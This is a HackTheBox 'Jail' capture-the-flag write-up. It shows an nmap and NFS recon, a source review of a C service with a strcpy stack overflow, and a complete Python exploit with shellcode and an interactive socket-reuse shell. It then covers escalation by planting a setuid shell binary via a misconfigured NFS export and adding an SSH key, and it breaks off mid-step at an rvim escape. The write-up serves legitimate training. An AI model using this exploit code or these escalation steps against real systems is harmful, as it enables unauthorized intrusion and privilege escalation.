# Jail [HTB](https://app.hackthebox.com/machines/45)
![jail-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/jail-01.png)

## Recon

After adding the target to my `/etc/hosts` file I start scanning for open ports:

```bash
nmap -p- --min-rate 10000 jail.htb
```

![ports-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/ports-02.png)


From here I start probing the found ports:

```bash
nmap -p 22,80,111,2049,7411,20048 -sCV jail.htb -oN nmap.result
```

![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/nmap-res-03.png)
![nmap-res-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/nmap-res-04.png)
![nmap-res-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/nmap-res-05.png)


We have the following:

+ An SSH server on port 22.
+ An Apache/2.4.6 server on port 80.
+ RPCbind on port 111.
+ NFS on port 2049.
+ A "daqstream" service on port 7411.
+ Mountd on port 20048.


Looking through the list, the service that jumps out the most to me is NFS on port 2049. The NFS protocol is an old client/server protocol that allows users to mount filesystems across the network, though it has no real mechanism for authentication or authorization. Rather, older versions of NFS rely on the UID/GID of the shared filesystem to authorize access. While newer versions of NFS support ACL based authorization as well.


Along with that, we have RCPbind running on port 111. It's failry common to see NFS running with an RPCbind endpoint-mapper, but I doubt that it will give us anything super useful. We also have what `nmap` thinks to be `mountd` on port 20048, though based on my searches, I've seen conflicting evidence as to what this service/port is meant to be.


Finally, we have what looks like an unfamiliar service of "daqstream" running on port 7411, as well as Apache and SSH servers. 


Let's start with the NFS service and see what we can find. 

## NFS Port 2049

I start by listing the possible shares on the target using:

```bash
showmount -e jail.htb
```

![shares-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/shares-06.png)


The target is hosting two shares, so I decide to mount them. To do that, I create a dedicated directory, and mount a share as such:

```bash
mkdir /mnt/jail
mount -t nfs jail.htb:/var/nfsshare /mnt/jail -o nolock
```

The mount is successful, though we cant read the share's contents:

![nfs-fail-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/nfs-fail-07.png)


But writing to the share is successful:

![nsf-write-07.5](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/nfs-write-07.5.png)


This will be useful later on. But if you noticed, I used a low-privilege user from my system. This user account is mapped to GID of 1000 on my Kali VM, and only he, has write permissions to the share. 


If we list the permissions of the `/mnt/jail` directory with numeric UID/GID values we can see something confusing:

![nfs-perms-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/nfs-perms-08.png)


The UID/GID permissions of the share are mapped to `0/1000`, the owner of the share is the only one who can read it's contents, and anyone with a GID of 1000 can write to the share. Therefore, based on these permissions we should have full access to this share as `root`, but we don't. Only a user with a GID mapped to 1000 can we have write access to the share. 


It's unclear at the moment why this is, but this has to do with the way the target system configured it's share export policy. We will understand this better when we land on the box. 


But for now, the key takeaway from all of this, is that we have write access to the `/var/nfsshare` share through a user with GID of 1000. With that said, lets go check the Apache server.


## Apache Port 80

If we browse towards `http://jail.htb/index.html` we see the following page:

![index-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/index-09.png)


Not much to see or do here, so I ran a directory and file scan using the following command:

```bash
ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://jail.htb/FUZZ -e .txt,.xml,.html,.js,.php
```

![ffuf-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/ffuf-10.png)


+ `/prisoner.html` 

The page returns:

![prisoner-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/prisoner-11.png)


Not much we can do here either. The only thing I noted is the `S12356S` string in the cell bar, maybe it's a password? 


+ `/jailuser`

This directory has another directory of `/dev` inside it:

![jailuser-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/jailuser-12.png)


Opening the `dev` directory results in the following:

![dev-dir-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/dev-dir-13.png)


We can see the source code for a "jail" application written in C, along with a bash compilation script and what could be a compiled version?


I download all of the files to my attack machine to analyze.


## Buffer-Overflow 

It was pretty clear to me that we are dealing with some sort of a buffer-overflow attack after seeing the contents of the `/jailuser/dev` directory. My guess was that the application running on port 7411 is our target, but we will see that later. 


Let's start with the most important file, the source code.


### Source Code Review

I will divide the `jail.c` file based on the three main functions defined in it, and cover each function separately. Then, I will quickly summarize the file and bring everything together, so bare with me on this. 


+ `auth` 

This is the first function defined in the code, and it reads as such:

```c
int auth(char *username, char *password) {                                                               
    char userpass[16];                                                                                   
    char *response;                                                                                      
    if (debugmode == 1) {                                                                                
        printf("Debug: userpass buffer @ %p\n", userpass);                                               
        fflush(stdout);                                                                                  
    }
    if (strcmp(username, "admin") != 0) return 0;
    strcpy(userpass, password);
    if (strcmp(userpass, "1974jailbreak!") == 0) {
        return 1;
    } else {
        printf("Incorrect username and/or password.\n");
        return 0;
    }
    return 0;
}
```

The general goal of the function is very simple, take two input arguments of `username` and `password` and comapre them againts the valid credentials via the `strcmp` function. The correct credentials are hard coded to the function in clear text (bad practice) and are `admin : 1974jailbreak!`. 


How the application gets the `username` and `password` arguments is very important and it will be covered in the next function. The most important aspects to note in the `auth` function though, are the `userpass` variable, and the `strcpy` function. 


Pay close attention, the `auth` function starts by defining a *16-byte long array* and maps it to a variable called `userpass`. A few lines later, the `auth` function copies whatever was supplied in the `password` argument into the `userpass` byte array *using the `strcpy` function*. At this point precisely a stack based buffer-overflow occurs and I will explain why in a bit. 


The [strcpy](https://www.programiz.com/c-programming/library-function/string.h/strcpy) function, is notorious for being vulnerable to memory-corruption attacks *due to it's lack of bound checking when copying the variables*. 


In other words, `strcpy` copies whatever is in varialbe `A` into variable `B` without checking that the size of variable `A` actually fits the size of variable `B` or any other size for that matter.  


So when these variables get loaded into a function's stack during runtime, variable `A` can overflow the buffer via the `strcpy` function because nothing is preventing it from doing so. And if variable `A` happens to reach the return address of the stack, it may alter the application's logic the way it sees fit. 


In the case of our `auth` function, the `B` variable being written to by `strcpy`, is the 16-long byte array `userpass`. And the `A` variable being copied into `B` is a variable controlled by us, and it's defined in the `handle` function. 


+ `handle`

The function reads as such:

```c
int handle(int sock) 
    int n;              
    int gotuser = 0;
    int gotpass = 0;
    char buffer[1024];
    char strchr[2] = "\n\x00";
    char *token;
    char username[256];
    char password[256];
    debugmode = 0;
    memset(buffer, 0, 256);
    dup2(sock, STDOUT_FILENO);
    dup2(sock, STDERR_FILENO);
    printf("OK Ready. Send USER command.\n");
    fflush(stdout);
    while(1) {
        n = read(sock, buffer, 1024);
        if (n < 0) {
            perror("ERROR reading from socket");
            return 0;
        }
        token = strtok(buffer, strchr);
        while (token != NULL) {                                
            if (gotuser == 1 && gotpass == 1) {                
                break;         
            }                      
            if (strncmp(token, "USER ", 5) == 0) {                            
                strncpy(username, token+5, sizeof(username));                                                                                                
                gotuser=1;                                                    
                if (gotpass == 0) {                                           
                    printf("OK Send PASS command.\n");                                                                                                       
                    fflush(stdout);                                           
                }                            
            } else if (strncmp(token, "PASS ", 5) == 0) {                                                                                                                           
                strncpy(password, token+5, sizeof(password));
                gotpass=1;
                if (gotuser == 0) {
                    printf("OK Send USER command.\n");
                    fflush(stdout);
                }                                   
            } else if (strncmp(token, "DEBUG", 5) == 0) {
                if (debugmode == 0) {
                    debugmode = 1;
                    printf("OK DEBUG mode on.\n");
                    fflush(stdout);
                } else if (debugmode == 1) {
                    debugmode = 0;
                    printf("OK DEBUG mode off.\n");
                    fflush(stdout);
                }                                   
            }                                       
            token = strtok(NULL, strchr);
        }                                           
        if (gotuser == 1 && gotpass == 1) {
            break;                                  
        }                                           
    }                                               
    if (auth(username, password)) {
        printf("OK Authentication success. Send command.\n");
        fflush(stdout);                             
        n = read(sock, buffer, 1024);
        if (n < 0) {                                
            perror("Socket read error");
            return 0;                               
        }                                           
        if (strncmp(buffer, "OPEN", 4) == 0) {
            printf("OK Jail doors opened.");
            fflush(stdout);
        } else if (strncmp(buffer, "CLOSE", 5) == 0) {
            printf("OK Jail doors closed.");
            fflush(stdout);
        } else {                                    
            printf("ERR Invalid command.\n");
            fflush(stdout);
            return 1;                               
        }                                           
    } else {                                        
        printf("ERR Authentication failed.\n");
        fflush(stdout);                             
        return 0;                                   
    }                                               
    return 0;                                       
} 
```

The function is a bit long, as it's the meat and bones of the application, but I will try to distill it down to only the relevant parts. 


The primary purpose of this function is to read the user's supplied "commands", parse them, and handle them accordingly. The user's input is read form a socket file descriptor, and is split based on the `\n\x00` (new line) delimiter using the `strtok` function. 


The `handle` function starts by defining a few different local variabales. Among them, is the *256-long byte array* variable called `password`, which will become important later. 


Once the variables are defined, the `handle` function starts reading the user's input and specifically looking for the `USER` and `PASS` commands, which is how the user supplies their credentials. The logic of how the `handle` function parses our input is important, as it dictates how the arguments will later be passed to the `auth` function. 


The command parsing can be split into two parts: 


1) In the first part, the function uses the `strncmp` function to comapre the first 5-bytes of the user's input with the hardcoded commands registerd in the function. For example, `(strncmp(token, "USER ", 5)` checks that the the user's input (i.e the `token`) is equal to the string `"USER "`. This is how the function determines which commands have been supplied by the user. The exact same logic occurs for the `PASS` command. 


2) This is the most important aspect of the function so read carefully. The function uses the [strncpy](https://www.w3resource.com/c-programming/string/c-strncpy.php) function to copy whatever is supplied after the `"USER"` command into the `username` variable. For example, a supplied input of "USER admin", will result in `username="admin"`. The same logic applies for the `PASS` command for storing the supplied password value.


Unlike the `strcpy` function though, `strncpy` copies at an explicit maximum amount of bytes from variable `A` into variable `B`. In this case, variable `A` is whatever we supply as the user, and variable `B` is a *256-long byte array*. The maximum amount of bytes copied by `strncpy` is set to length of `username/password` variables, which are both 256-long byte arrays. 


So in other words, *our supplied credentials are stored as a 256-long byte array* in the application. This piece of information is huge, so keep it in mind. 


After the application successfully stores our supplied creds in memory, it passes it into the `auth` function for further evaluation in the following line:

```c
if (auth(username, password)) {		
        printf("OK Authentication success. Send command.\n");
```

If you recall, the `auth` function uses `strcpy` to copy whatever is in the `password` variable, into the *16-long byte array* `userpass`. But we now know that the `password` argument being copied by `strcpy` is actually a *256-long byte array*. 


So in other words, the application is writting (at max) a 256-byte variable *we control* into a 16-long byte variable, without any bounds checks. This is a stack-based buffer-overflow vulnerability! 


before we get into that, we have one more function to go over, though this will be brief. 


+ `main`

The function reads as such:

```c
int main(int argc, char *argv[]) {                                                                       
    int sockfd;                                                                                          
    int newsockfd;                                                                                       
    int port;                                                                                            
    int clientlen;                                                                                       
    char buffer[256];                                                                                    
    struct sockaddr_in server_addr;                                                                      
    struct sockaddr_in client_addr;                                                                      
    int n;                                                                                               
    int pid;                                                                                             
    int sockyes;                                                                                         
    sockyes = 1;                                                                                         
    sockfd = socket(AF_INET, SOCK_STREAM, 0);                                                            
    if (sockfd < 0) {
        perror("Socket error");
        exit(1);
    }
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &sockyes, sizeof(int)) == -1) {
        perror("Setsockopt error");
        exit(1);               
    }                          
    memset((char*)&server_addr, 0, sizeof(server_addr));                                                                      
    port = 7411;               
    server_addr.sin_family = AF_INET;                          
    server_addr.sin_addr.s_addr = INADDR_ANY;                  
    server_addr.sin_port = htons(port);                        
    if (bind(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {                                              
        perror("Bind error");                                  
        exit(1);               
    }                          
    listen(sockfd, 200);       
    clientlen = sizeof(client_addr);                           
    while (1) {                
        newsockfd = accept(sockfd, (struct sockaddr*)&client_addr, &clientlen);                                               
        if (newsockfd < 0) {                                   
            perror("Accept error");                            
            exit(1);           
        }                      
        pid = fork();          
        if (pid < 0) {         
            perror("Fork error");                              
            exit(1);           
        }                      
        if (pid == 0) {        
            close(sockfd);                                     
            exit(handle(newsockfd));                           
        } else {               
            close(newsockfd);                                  
        }                      
    }                          
}
```


The main purpose of this funciton is to instantiate the server socket and bind it to port `7411`. So now we know what this port is doing on the target. 


Once the server is up and running, it waits for connections indefinitely. When a connection arrives, the applicaiton forks itself to spwan a child process using the `fork` function, and assinges the new connection to the `handle` function for user input parsing, etc.  


+ To summarize

The main purpose of the application is to handle authentication, after we supply the correct credentials not much will happen. It's through the password value where a buffer-overflow attack will happen. 


If you are a keen observer, you probably noticed that there was an additional command we can supply to the application, which is the `DEBUG` command. Supplying this command will result in the application displaying the memory address of the vulnerable `userpass` varialbe. This will come in handy later on, as it will be the base location of our payload. 


There were also two more files included in the `/jailuser/dev` directory, which were `jail` and `compile.sh`.


The former is just the compiled version of the `jail.c` source code, and we will use it while crafting our exploit. We can run `readelf` on it to get more information:

![readelf-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/readelf-14.png)


We can see it's a 32-bit executable file in [little endian](https://en.wikipedia.org/wiki/Endianness) format. Meaning, the bytes are stored in reversed. This will be important as we develop our exploit. 


The `compile.sh` script shows how the `jail.c` has been compiled by our target system:

![compile-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/compile-15.png)


The most important thing about this file is the compilation process with the `gcc` command. Here is the breakdown:

+ `-o jail jail.c`: Complile the `jail.c` source code into a final executable file of `jail`.
+ `-m32`: Architecture is set to 32-bit. 
+ `-z execstack`: *Make both the heap and stack of the application executable* 


The last option will make it much easier to develop a reliable exploit, but I will exaplin why when we get there. 


With that said, we've covered everything, let's start crafting our exploit. 


### Exploit Development

I spawn a new shell on my local machine in which I run the `jail` binary, and I grep to see that port `7411` is now open:

![running-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/running-16.png)


Looks good. 


To start, I want to see if I can crash the application with a `segmentation fault` error which will generate a core dump file. We need this core dump so we can analyze it in a debugger. 


To make sure your system produces core dumps, run the following command in the shell in which `jail` is running:

```bash
ulimit -c unlimited
```

This should enable core dumps. 


Now, I generate a 256-byte long string to use as the password value with the following command:

```bash
python -c "print('A'*256)"
``` 

Once I have this printed in my terminal, I connect to the application running on my localhost using `nc localhost 7411`, I send the correct username command of `USER admin`, and the long password we generated:

![initial-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/initial-17.png)


It looks like nothing happned and the application is still running, this is becasue it's a multi-process application. The child process who handled our connection did crash, but the parent process didn't. Therefore it looks like nothing happned, but if we take a look at the running processes on our system we will find the child process who handled our connection is now a zombie process waiting for it's parent to terminate so it can die.  


At any case, we can list the contents of the directory in which `jail` is running and see a new `core` file:

![core-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/core-18.png)


Let's analyze this core dump in the `gdb` debugger:

```bash
gdb -q -core core
```

![gdb-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/gdb-19.png)


We did manage to provoke a segmentation fault error. In the last line of the output, We can see the value of `0x41414141`, this is a part of our password value ('A' in hex is 41). Why is `gdb` showing it here? 


Because it's the root cause of the crash. This is the value of the EIP register, which is the return address of the function being executed. In other words, it tells the application where to find it's next set of instructions. Becasue we gave the application a memroy address that doens't exists, we got the `segmentation fault` error which crashed the process who handled our connection. 


To understand this better, take a look at the following diagrm:

![stack-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/srack-20.png)


Our `password` and `userpass` variables are placed in the `local variables` section when the `auth` function is executed. This is, in essence, the buffer. Because `strcpy` doesn't validate variable bounds, supplying a large input to the `password` variable will cause `strcpy` to overwrite the entire buffer all the way from the ESP register, up past the EBP register (stack based pointer), and up until the retrun address, i.e the EIP register. 


We can list out the values in the registers in the `gdb` instance of our core dump with the `info registers` command:

![registers-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/registers-21.png)


We can see that we managed to surpass the EBP register and reach the EIP register. Now we need to find the offset of the EIP regiter from the start of the stack. This will tell us the exact length of the payload we need to send in order to successfully overwrite the return address with an instruciton we control.


We can find the EIP offset using a tool called `pattern_create`. In my Kali, I create an alias for it as such:

```bash
alias pattern_create=/usr/share/metasploit-framework/tools/exploit/pattern_create.rb
```

Now I can invoking it by running `pattern_create`. 


Let's use it to generate a unique string that we'll send as the password value:

```bash
pattern_create -l 256
```

![pattern-create-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/pattern-create-22.png)


Now, I connect to the target application at my localhost, supply the password and cause a core dump. I open the core dump in `gdb` same as before, and I list the registers:


![list-registers-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/list-registers-23.png)


We can see that the EIP's value is `0x62413961`, but this is in hex, we need to translate it into ASCII. 
To do that, we can define a function inside `gdb` to translate the hex into ascii for us. We can do that as such:

```gdb
(gdb) define asciiprint
 set $len = sizeof($arg0)
 set $val = (unsigned long long)($arg0)
 while $len-- > 0
   set $char = $val & 0xff
   if $char >= 0x20 && $char <= 0x7e
     printf "%c", $char
   else
     printf "\\x%02x", $char
   end
   set $val >>= 8
 end
 printf "\n"
end
```


Now we can print the value of the EIP register by running our function:

![ascii-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/ascii-24.png)


We can see that the ASCII value of the EIP register is `a9Ab`. We need to supply this value to another tool called `pattern_offset`, for which I create an alias as well:

```bash
alias pattern_offset=/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb
```

From there, I get the offset of 28-bytes to the EIP register:

![offset-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/offset-25.png)


We can verify that the offset is indeed 28 bytes by sending exactly 28 "A" characters followed by 4 "B" characters. This should result in the EIP register storing a value of `0x42424242`, which are the four B's in HEX. 


I create the payload with the following command: `python -c "print('A'*28 + 'B'*4)"`, I copy it and send it to the application running on my localhost, which causes a core dump. 


I open the core dump in `gdb` and see this:

![bees-26](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/bees-26.png)


Perfect! This validates that the EIP register is found exactly 28 bytes after the `"PASS "` command. 


Now are near the end, we only need to find a way to orginzize our payload so it will execute. Let's talk about this for a sec. 


We know from the compilation syntax of this binary, that both the stack and the heap are executable, (as per the `execstack` argument). This means that we don't have to lookup an upcode for a specific JUMP instruction in order to point the application to our shellcode. But rather, we can add our shellcode directly on to the stack, and point the EIP register to the exact location of our shellcode in the current stack.


But how can we find the exact location of our shellcode in the current stack at runtime? 


For this reason, the application gives us the `DEBUG` command which prints the memory address of the `userpass` variable. The `userpass` variable *is the location in memory at which our payload starts*. Based on that, we can calculate the exact location of our shellcode, and point the EIP register directly to it. 


This is simple, we know that in order to overflow the buffer and reach the EIP register we need 28 bytes. Then, we overwrite the EIP with 4 more bytes, which brings us to 32 bytes. So *the shellcode will be located exactly 32 bytes after the start of `userpass` variable*. And becasue we know the address of this variable, we can point the EIP to our shellcode reliably. 


When we retrieve the memory address of the `userpass` variable using the DEBUG command, we will find that it's always the same address (but it will be different on the target):

![location-27](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/location-27.png)


This eases the process of developing a reliable exploit for us, as we only need to point the EIP register to the memory address which sits 32 bytes after the `userpass` variable address. 


To do that I've created a simple script, which will later become the exploit:

```python
!/usr/bin/python3
import socket

username = b'USER admin'
passwd = b'PASS '


offset = 28                        # Number of bytes to get to the EIP register
eip = int('ffffc7f0', 16) + 32     # Turn the start address to integer and add 32 to it
eip = eip.to_bytes(4, 'little')	   # Final shellcode location

pad = b'A' * offset		   
fluff = b'\xFF' * 16

payload = passwd + pad + eip + fluff


# Start socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    sock.connect(('localhost', 7411))
    sock.recv(1024)
    sock.send(username)        # Send 'USER admin' command

    sock.recv(1024)
    sock.send(payload)         # Send the payload
    sock.close()
except Exception as e:
    print(e)
    exit()
``` 


I'm turnning the `0xffffc7f0` address into an integer in order to add 32 to it. Then I turn it back into bytes in little-endian format. 


The actual payload starts with the 28 A's needed to reach the EIP. Then, the EIP is pointed to 32 bytes after the start of the `userpass` variable (a.k.a out payload). And finally Iv'e added some `fluff` to the end just to see if the program tries to run it and breaks (should not be segmentation fault). Afterwards I will add instructions for a shell. 


Executing this script results in a new core dump, and when I open it, I see a new error:

![new-err-28](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/new-err-28.png)


No longer did the program crash due to a `segmentation fault` caused by an invalid memory address in the EIP. This time, the program crashed becasue the instructions pointed to by the EIP were `Illegal`. 


If we list the registers we can see the following:

![regsiters-29](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/registers-29.png)


If we look at the 33 bytes of data prior to the EIP, we can see our payload:

![payload-30](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/payload-30.png)


We can see all of our A's, and then the highlighted EIP register which actually jumped one address forwards after the interrupt. Following the EIP we can see our `\xFF` bytes, which caused the crash. 


At this point we should be ready to replace our faulty `\xFF` bytes, with a working shellcode.


At first, I tried generating a reverse shell payload using `msfvenom`, and add that right after the EIP. Though this crashed the application with a `segmentation fault` once again! Why?


Instead, I decided to use a shellcode that simply spwans `/bin/sh` locally, and then find a way to get an interactive shell from it. For that I used [this shellcode](https://www.exploit-db.com/exploits/34060) from ExploitDB.


So now the start of my exploit looks like this:

```python
shellcode = b""
shellcode += b"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
shellcode += b"\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
shellcode += b"\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
shellcode += b"\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
shellcode += b"\x89\xe3\x31\xc9\xcd\x80"

username = b'USER admin'
passwd = b'PASS '


offset = 28                         
eip = int('ffffc7f0', 16) + 32 
eip = eip.to_bytes(4, 'little')

pad = b'A' * offset

payload = passwd + pad + eip + shellcode
```

The rest of the exploit it the same. 


Running this exploit worked, and the program remained in tact without causing any core dumps. When looking in `htop`, I can see that a child process of `jail` spwaned `/bin/sh`:

![spwaned-31](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/spawnd-31.png)


This is great, but at the moment, we can't interact with this shell. To solve this issue, we need to incorporate a conecept called `socket reuse`. 


In short, we need to define a function that can take the socket file descriptor object, and parse the stdin, stdout & stderr I/O channels, redirecting them between ourselvs and our target through the original socket connection. 


All in all my final exploit looks like this:

```python
#!/usr/bin/python3
import socket, select, time

shellcode = b""
shellcode += b"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
shellcode += b"\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
shellcode += b"\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
shellcode += b"\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
shellcode += b"\x89\xe3\x31\xc9\xcd\x80"

username = b'USER admin'
passwd = b'PASS '

offset = 28                         
eip = int('ffffc7f0', 16) + 32     
eip = eip.to_bytes(4, 'little')
pad = b'A' * offset

payload = passwd + pad + eip + shellcode


def shell(fd):
    while True:
        inputready, outputready, exceptready = select.select([fd], [fd], [])
        if len(inputready) != 0:
            recvd = [ _ for _ in fd.recv(1024).decode('iso-8859-1').split("\n") if _ ]
            if recvd:
                print("\n".join(recvd))
        else:
            command = input("shell> ")
            if command.lower() == "exit":
                break
            fd.send(command.encode()+b"\n")
            time.sleep(0.1)


try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('localhost', 7411))
    sock.recv(1024)
    sock.send(username)        # Send 'USER admin' command

    sock.recv(1024)
    sock.send(payload)         # Send the payload
    
    shell(sock)		       # Start interactive shell

except Exception as e:
    print(e)
    exit()
``` 


When I run this againts my localhost I get a working shell:

![home-shell-32](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/home-shell-32.png)


Looks good. 


Now all we need to do, is connect to the target system and retrieve the address of the `userpass` variable using the `DEBUG` command, and change the socket settings so that the exploit connects to the target and not my localhost. 


After the modifications, I run the exploit and get a shell:

![first-shell-33](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/first-shell-33.png)


The shell is a bit clunky, but it will do for now. 


## Privilege Escalation

As can be seen from the above screenshot of the `id` command, it appears that we are in some sort of restrictive shell environment. Looking through the filesystem also confirms that, as there are extendible attributes on directories. 


If we list our `sudo` permissions we can see something intersting:

![sudo-34](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/sudo-34.png)


We are able to run the `/opt/logreader/logreader.sh` script as the user `frank`, which is the only user account on the system:

![users-35](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/users-35.png)


But, we dont have any permissions to read the script, nor do we have permission to enter the `/opt/logreadedr` directory:

![no-perms-36](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/no-perms-36.png)


Trying to execute the script results in a somewhat cryptic output:

![logreader-output-37](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/logreader-output-37.png)


I tried searching the term `checkproc` online, but I found nothing substantial that can help us move forward. I tried running `strace` on this script but to no avail. Eventually I decided to have a look around the filesystem a bit. 


In the `/var` directory there is `nfsshare` share from before:

![nfs-owned-38](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/nfs-share-38.png)


We can see that the NFS share has the GID of `frank`. When I mounted this share on my attack machine earlier, the GID was translated to the local user matching this GID on my local machine, `ice`. 


If we take a look at the export rules in `/etc/exports` we can see why:

![exports-39](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/exports-39.png)


Here is the breakdown:

+ `rw`: Mount the share with read/write permissions.

+ `root_squash`: Even if root is the user accessing the files on the remote machine, treat them as the default user from the local machine (The reason we didn't have access to the share as root).

+ `no_all_squash`: Translate all the user permissions from the remote machine to the local machine. Meaning that, *files writting to the share from a UID of 1000, will be woned by UID 1000 on the local machine* (The reason we can only write to the share as `ice`).


This piece of information is huge, this means that we can effectively create files on the target machine as `frank` from our attack machine. 


To exploit this, we need to write a simple setUID binary, compile it, and place it in the `nfsshare` as `ice`. Then, we can execute it from `jail` as `nobady` to spwan a shell as `frank`.


In order for me to pull this off, I had to use an old CentOS VM I had, due to compatibility issues with the glibc version on `jail`. My CentOS and GCC info:

```bash
bash$ uname -r
3.10.0-1160.90.1.el7.x86_64
bash$ gcc --version
gcc (GCC) 4.8.5 20150623 (Red Hat 4.8.5-44)
```

In this box, I created the following setUID file:

```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setresuid(1000, 1000, 1000);
    system("/bin/bash");
    return 0;
}
```

I compiled it using the follwing command:

```bash
gcc frank.c -o frank
```

I then transfer this file over to my attack machine, and make `ice` the owner of this binary using:

```bash
chown ice:ice frank
```

At this point, I mount the `/mnt/nfsshare` same as before, and I run `su ice`. Now as `ice`, I copy the file over to the share and set the proper permissions to it so that everyone could execute it on `jail`:

```bash
cp frank -o /mnt/jail/frank
chmod 4777 /mnt/jail/frank
```

![cp-40](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/cp-40.png)


Now, I execute this file from `jail` and I spwan a shell as `frank`:

![frank-41](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/frank-41.png)


Now as frank, I will navigate towards `/home/frank/.ssh`, and write an SSH key for my user `ice`, so I can connect via ssh:

```bash
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFz/1ClT3bpKK912+SHK2hvTIgYAk5rf42UEN06WoQbC nobody@anything' >> authorized_key
```

![write-ssh-42](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/write-ssh-42.png)


Now I can connect to the SSH as `frank`:

![frank-ssh-43](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/frank-ssh-43.png)


### Frank

If we take a look at `frank`'s home directory, we can see the presence of a `bin` directory, inside of which, we can find a `logreader.sh` script:

![bin-dir-43](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/bin-dir-43.png)


The script reads as such:

![checkproc-script-44](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/checkproc-script-44.png)

It simply counts the number of processes on the system and prints them out to a log file at `/home/frank/logs/checkproc.log`. The output format is identical to the `/opt/logreader/logreader.sh` script that the `nobody` user can run as `frank` via `sudo`.


If we take a look at the `/opt/logreader/logreader.sh` script, we can see that it simply reads the contents of the `/home/frank/logs/checkproc.log` log file:

![checkproc-script-45](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/checkproc-script-45.png)


If we list `frank`'s cronjobs, we can see the `checkproc.sh` scripts runs every few seconds, filling up `/home/frank/logs/checkproc.log`. Then another cronjob runs once a day at 12:00 PM to clean up the log file:

![frank-crons-46](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/frank-crons-46.png)


This doesn't really tell us much, the `checkproc.sh` script isn't really useful, It's probably a rabbit-hole. 


Instead, if we list out `frank`'s `sudo` permissions we can see the following:

![frank-sudo-47](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/frank-sudo-47.png)


We are able to run `/usr/bin/rvim` (restricted VIM) binary on the source file of jail at `/var/www/html/jailuser/dev/jail.c`. [GTFObins](https://gtfobins.github.io/gtfobins/rvim/) has a few techniques to leverage `rvim` to get a shell. 

![gtfo-48](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jail/img/gtfo-48.png)


We can't run these commands directly because we are restricted to a specific sudo command. But we can try to run them from within the `rvim` interface. 


First, I run the `sudo` command:

```bash
